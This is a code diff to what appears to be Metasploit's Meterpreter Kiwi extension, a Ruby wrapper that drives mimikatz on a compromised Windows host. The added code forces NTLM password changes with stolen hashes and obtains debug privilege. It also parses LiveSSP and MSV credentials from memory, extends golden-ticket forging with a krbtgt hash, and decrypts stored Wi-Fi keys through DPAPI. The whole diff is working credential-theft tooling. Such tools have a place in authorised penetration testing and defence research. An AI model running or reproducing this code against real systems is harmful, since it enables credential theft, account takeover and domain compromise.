@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'rex/post/meterpreter/extensions/kiwi/tlv'
+require 'rex/post/meterpreter/extensions/kiwi/command_ids'
 require 'rexml/document'
 require 'set'
 
@@ -21,6 +22,10 @@ module Kiwi
 ###
 
 class Kiwi < Extension
+
+  def self.extension_id
+    EXTENSION_ID_KIWI
+  end
 
   #
   # Typical extension initialization routine.
@@ -43,7 +48,7 @@ class Kiwi < Extension
   end
 
   def exec_cmd(cmd)
-    request = Packet.create_request('kiwi_exec_cmd')
+    request = Packet.create_request(COMMAND_ID_KIWI_EXEC_CMD)
     request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
     response = client.send_request(request)
     output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
@@ -51,6 +56,42 @@ class Kiwi < Extension
     output = output[output.index('mimikatz(powershell) #') + 1, output.length]
     # return everything past the newline from here
     output[output.index("\n") + 1, output.length]
+  end
+
+  def password_change(opts)
+    cmd = "lsadump::changentlm /user:#{opts[:user]}"
+    cmd << " /server:#{opts[:server]}" if opts[:server]
+    cmd << " /oldpassword:#{opts[:old_pass]}" if opts[:old_pass]
+    cmd << " /oldntlm:#{opts[:old_hash]}" if opts[:old_hash]
+    cmd << " /newpassword:#{opts[:new_pass]}" if opts[:new_pass]
+    cmd << " /newntlm:#{opts[:new_hash]}" if opts[:new_hash]
+
+    output = exec_cmd("\"#{cmd}\"")
+    result = {}
+
+    if output =~ /^OLD NTLM\s+:\s+(\S+)\s*$/m
+      result[:old] = $1
+    end
+    if output =~ /^NEW NTLM\s+:\s+(\S+)\s*$/m
+      result[:new] = $1
+    end
+
+    if output =~ /^ERROR/m
+      result[:success] = false
+      if output =~ /^ERROR.*SamConnect/m
+        result[:error] = 'Invalid server.'
+      elsif output =~ /^ERROR.*Bad old/m
+        result[:error] = 'Invalid old password or hash.'
+      elsif output =~ /^ERROR.*SamLookupNamesInDomain/m
+        result[:error] = 'Invalid user.'
+      else
+        result[:error] = 'Unknown error.'
+      end
+    else
+      result[:success] = true
+    end
+
+    result
   end
 
   def dcsync(domain_user)
@@ -95,8 +136,16 @@ class Kiwi < Extension
     exec_cmd('lsadump::cache')
   end
 
+  def get_debug_privilege
+    exec_cmd('privilege::debug').strip == "Privilege '20' OK"
+  end
+
   def creds_ssp
     { ssp: parse_ssp(exec_cmd('sekurlsa::ssp')) }
+  end
+
+  def creds_livessp
+    { livessp: parse_livessp(exec_cmd('sekurlsa::livessp')) }
   end
 
   def creds_msv
@@ -120,10 +169,44 @@ class Kiwi < Extension
     {
       msv: parse_msv(output),
       ssp: parse_ssp(output),
+      livessp: parse_livessp(output),
       wdigest: parse_wdigest(output),
       tspkg: parse_tspkg(output),
       kerberos: parse_kerberos(output)
     }
+  end
+
+  # TODO make sure this works as expected
+  def parse_livessp(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an livessp line
+      next if line !~ /\slivessp\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      while line =~ /\[\d+\]/
+        line = lines.shift
+        # then the next 3 lines should be interesting
+        livessp = {}
+        3.times do
+          k, v = read_value(line)
+          livessp[k.strip] = v if k
+          line = lines.shift
+        end
+
+        if livessp.length > 0
+          results[livessp.values.join('|')] = livessp
+        end
+      end
+    end
+
+    results.values
   end
 
   def parse_ssp(output)
@@ -133,7 +216,7 @@ class Kiwi < Extension
     while lines.length > 0 do
       line = lines.shift
 
-      # search for an wdigest line
+      # search for an ssp line
       next if line !~ /\sssp\s:/
 
       line = lines.shift
@@ -271,11 +354,18 @@ class Kiwi < Extension
       # did we find something?
       next if line.blank?
 
-      # the next 4 lines should be interesting
       msv = {}
-      4.times do
-        k, v = read_value(lines.shift)
-        msv[k.strip] = v if k
+      # loop until we find a line that doesn't start with
+      # an asterisk, as this is the next credential set
+      loop do
+        line = lines.shift
+        if line.strip.start_with?('*')
+          k, v = read_value(line)
+          msv[k.strip] = v if k
+        else
+          lines.unshift(line)
+          break
+        end
       end
 
       if msv.length > 0
@@ -345,6 +435,9 @@ class Kiwi < Extension
       opts[:domain_name],
       " /sid:",
       opts[:domain_sid],
+      " /startoffset:0",
+      " /endin:",
+      opts[:end_in] * 60,
       " /krbtgt:",
       opts[:krbtgt_hash],
       "\""
@@ -377,6 +470,57 @@ class Kiwi < Extension
     end
 
     content.join('')
+  end
+
+  #
+  # Access and parse a set of wifi profiles using the given interfaces
+  # list, which contains the list of profile xml files on the target.
+  #
+  # @return [Hash]
+  def wifi_parse_shared(wifi_interfaces)
+    results = []
+
+    exec_cmd('"base64 /in:off /out:on"')
+    wifi_interfaces.keys.each do |key|
+      interface = {
+        :guid     => key,
+        :desc     => nil,
+        :state    => nil,
+        :profiles => []
+      }
+
+      wifi_interfaces[key].each do |wifi_profile_path|
+        cmd = "\"dpapi::wifi /in:#{wifi_profile_path} /unprotect\""
+        output = exec_cmd(cmd)
+
+        lines = output.lines
+
+        profile = {
+          :name        => nil,
+          :auth        => nil,
+          :key_type    => nil,
+          :shared_key  => nil
+        }
+
+        while lines.length > 0 do
+          line = lines.shift.strip
+          if line =~ /^\* SSID name\s*: (.*)$/
+            profile[:name] = $1
+          elsif line =~ /^\* Authentication\s*: (.*)$/
+            profile[:auth] = $1
+          elsif line =~ /^\* Key Material\s*: (.*)$/
+            profile[:shared_key] = $1
+          end
+        end
+
+        interface[:profiles] << profile
+      end
+
+      results << interface
+    end
+    exec_cmd('"base64 /in:on /out:on"')
+
+    results
   end
 
   #
@@ -416,4 +560,3 @@ class Kiwi < Extension
 end
 
 end; end; end; end; end
-
